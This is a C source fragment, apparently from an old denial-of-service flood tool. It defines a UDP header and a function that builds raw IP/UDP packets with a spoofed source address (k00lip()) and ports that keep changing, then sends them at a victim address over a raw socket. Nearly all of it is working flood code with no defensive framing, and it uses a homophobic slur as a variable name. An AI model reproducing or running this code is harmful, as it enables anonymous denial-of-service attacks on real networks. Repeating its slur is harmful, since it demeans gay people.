int fbi = 1, cia = 9999;

struct udphdr {
        u_short uh_sport;               /* source port */
        u_short uh_dport;               /* destination port */
        short   uh_ulen;                /* udp length */
        u_short uh_sum;                 /* udp checksum */
};

int
udp (int lamer)
{
  struct
    {
      struct ip ipi;
      struct udphdr udp;
      char evil[1024];
 
   }
  faggot;
  struct sockaddr_in llama;
 
  if (fbi++ > 9999)
    fbi = 1;
  if (cia-- < 1)
    cia = 9999;

  srandom ((time (NULL) + random ()));

  faggot.ipi.ip_hl = 5;
  faggot.ipi.ip_v = 4;
  faggot.ipi.ip_tos = 0x00;
  faggot.ipi.ip_len = htons (sizeof (struct ip) + sizeof(struct udphdr) + udppsize);
  faggot.ipi.ip_id = htons (random ());
  faggot.ipi.ip_off = 0;
  faggot.ipi.ip_ttl = 0xff;
  faggot.ipi.ip_p = IPPROTO_UDP;
  faggot.ipi.ip_src.s_addr = k00lip ();
  faggot.ipi.ip_dst.s_addr = lamer;
  faggot.ipi.ip_sum = ip_sum (&faggot.ipi, sizeof (faggot.ipi));

  faggot.udp.uh_sport = htons (cia);
  faggot.udp.uh_dport = htons (fbi);
  faggot.udp.uh_ulen = htons (sizeof (faggot.udp) + udppsize);

  llama.sin_family = AF_INET;
  llama.sin_addr.s_addr = lamer;

  sendto (rawsock, (void*)&faggot, (sizeof (struct ip) + sizeof(struct udphdr))+udppsize, 0, (struct sockaddr*)&llama,sizeof (llama));

  return 1;
}
